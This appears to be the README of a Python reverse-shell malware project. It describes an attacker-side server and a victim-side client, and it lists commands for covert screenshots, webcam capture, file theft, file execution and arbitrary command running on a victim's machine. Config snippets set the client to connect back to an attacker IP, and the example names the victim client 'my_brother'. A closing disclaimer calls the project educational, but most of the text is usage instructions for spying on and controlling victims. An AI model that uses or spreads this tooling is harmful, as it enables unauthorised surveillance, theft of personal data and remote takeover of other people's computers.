<h1>Malware-ReverseShell</h1>
<p><b>This python malware-program is a presentation of how can reverse shell works.</b></p>
<p>Revershe shell is type of malware where device of victim is connected in background to attacker. This way attacker can remotely control victim's computer, watch their activity, grab information and really anything that is in his desire.</p>

<div>
<img src="images/connection.png"/>
</div>

<p>Reverse shell malwares are divided into two main programs:</p>

<h2>Server Side Program</h2>
<p>Server side of the program belong to hacker/attacker.</p>
<p>Server program is started on specified ip address which can be as public as local with opened port. To this parameters is going to be victim connected. It is a console application so everything is happening inside of a console/terminal. </p>
<p>After successfully established connection attacker (server) can start sending pre-defined commands to victim (client). Some commands can be used before any client is connected (i named them server commands), but most of them are working only with connected client (server-client commands).</p>

<h3>Make server running and listening for upcomming connections</h3>

<b>Use console arguments</b>

<div>Show all possible commands/arguments</div>
<pre>python server.py --help</pre>

<div>Set ip address</div>
<pre>python server.py -ip [ip address]</pre>

<div>Set port</div>
<pre>python server.py -port [port]</pre>

<h5>If you don't want to manually set your ip address, you can use these arguments:</h5>
<div>Sets server on your local ip address</div>
<pre>python server.py -get-local-ip</pre>

<div>Sets server on your public ip address</div>
<pre>python server.py -get-external-ip</pre>

<b>Specify parameters in program</b>
```python
ip = '192.168.1.136'
port = 5000
server = Server(ip, port)
server.run()
```

<h3>Console Enviroment - Commands</h3>
<p>When you're in program after server's been initialized and it is listening for connections in background you still use commands that are not relited to client. These commands are only affecting your running server program.</p>
<p>You can list through all possible commands with command <i>list</i> or <i>print commands</i>.
<h4>Server commands</h4>

<div>print commands</h4>
<pre>print commands / list</pre>

<div>clear the screen</div>
<pre>clear</pre>

<div>show ip address</div>
<pre>show ip</pre>

<div>show port</div>
<pre>show port</pre>

<div>show directory where screenshots are going to be saved</div>
<pre>show screenshots directory</pre>

<div>show directory where webcam shots are going to be saved</div>
<pre>show webcam shots directory</pre>

<div>save ip and port data</div>
<pre>save</pre>

<div>set socket by client's name</div>
<pre>set [client's id or name]</pre>

<div>unset current selected user</div>
<pre>unset</pre>

<div>print new connections</div>
<pre>wait</pre>

<div>show all connected clients</div>
<pre>clients</pre>

<div>rename client</div>
<pre>rename [oldname newname]</pre>

<div>show name instead of path</div>
<pre>name mode</pre>

<h4>Server-client commands</h4>
<p>These are the commands that are related to client and they are sent to client wich is responding on them.</p>
<p>You list through the connected clients with command <i>client</i>.</p>
<p>After this you can set a client with command <i>set [client's id or name]</i> by clients id or name.</p>
<p>That's it! You can now send all cool commands to client and just like that start crawling through victim's computer, making screenshot, reading, sending or starting files etc. .</p>

<div>simple check if connection is all right with client</div>
<pre>check</pre>

<div>request name from client</div>
<pre>get name</pre>

<div>set and show client's path instead of name</div>
<pre>path mode</pre>

<div>change directory</div>
<pre>cd [options/directory]</pre>

<div>list directory</div>
<pre>dir [options]</pre>

<div>open web page by url</div>
<pre>web [url]</pre>

<div>Get screenshot from client</div>
<div>-d -> directory where screenshots are going to be saved</div>
<div>-s -> set start number for saving screenshots</div>
<pre>screenshot [-d (directory), -s (start number)]</pre>

<div>Get image from client's webcam</div>
<pre>webcam</pre>

<div>read and save file from client</div>
<pre>read [file]</pre>

<div>send file</div>
<pre>send [file]</pre>

<div>start and open file</div>
<pre>start [file]</pre>

<div>reset connection with client</div>
<pre>reset</pre>

<div>send any other command</div>
<pre>[command] -c</pre>

<div>close the program</div>
<pre>close/exit/quit</pre>

<h2>Client Side Program</h2>
<p>Before malware is started on client's machine, it needs to be configure it with server ip and port on wich server is listening for connections.</p>
<p>Client's program is going to overly trying to connect to this ip address and port.</p>
<p>After client is connected, everything is ready for attacker and he can start manipulating victim's device.</p>
<p>Initialize client's program by adding these cuple lines inside of client's malware program:</p>

```python
server_ip = '192.168.1.136'
port = 5000
name = 'my_brother'
client = Client(server_ip, port, name)
client.run()
```

<h4>In those examples I've used local ip address. Of course you can use public ip addresses but for that you need to have set up your own server with public ip address or without a public server you can try port forwarding (if you own public ip address from your isp) but be careful around that because there is a lot of security issues that can come.</h4>

<hr>

<p><sup>This project was made for educational purposes only.</sup></p>
<p><sup>You are the only responsable for your actions!</sup></p>
